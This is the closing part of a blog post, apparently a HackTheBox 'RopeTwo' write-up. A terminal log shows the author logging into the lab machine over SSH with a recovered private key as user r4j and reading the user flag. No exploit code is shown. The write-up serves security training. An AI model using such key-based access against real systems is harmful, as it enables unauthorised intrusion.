<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa r4j@10.10.10.196</span></span><br><span class="line">Welcome to Ubuntu 19.04 (GNU/Linux 5.0.0-38-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Sun Feb 21 14:56:24 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:  0.04               Processes:             302</span><br><span class="line">  Usage of /:   42.8% of 19.56GB   Users logged <span class="keyword">in</span>:       0</span><br><span class="line">  Memory usage: 39%                IP address <span class="keyword">for</span> ens160: 10.10.10.196</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">454 updates can be installed immediately.</span><br><span class="line">0 of these updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Sun Feb 21 14:53:20 2021 from 10.10.14.6</span><br><span class="line">r4j@rope2:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(r4j) gid=1000(r4j) <span class="built_in">groups</span>=1000(r4j)</span><br><span class="line">r4j@rope2:~$ <span class="built_in">whoami</span></span><br><span class="line">r4j</span><br><span class="line">r4j@rope2:~$ <span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">r4j@rope2:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">77fad0ddf2c6c7736a86ce77a44c204f</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rope2-rshell1.jpg"></li>
</ul>
<p><font color="red"><em><strong>Damn! Really Crazy! Ha?</strong></em></font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/" title="HackTheBox-RopeTwo-[pwn-rshell]">https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/02/15/Exploiting-the-Math-expm1-typing-bug-in-V8/" rel="prev" title="利用V8中的Math-expm1-typing漏洞">
                  <i class="fa fa-chevron-left"></i> 利用V8中的Math-expm1-typing漏洞
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/02/22/toxin/" rel="next" title="Hack-The-Box-pwn-challenge[Toxin]">
                  Hack-The-Box-pwn-challenge[Toxin] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">631k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">38:14</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
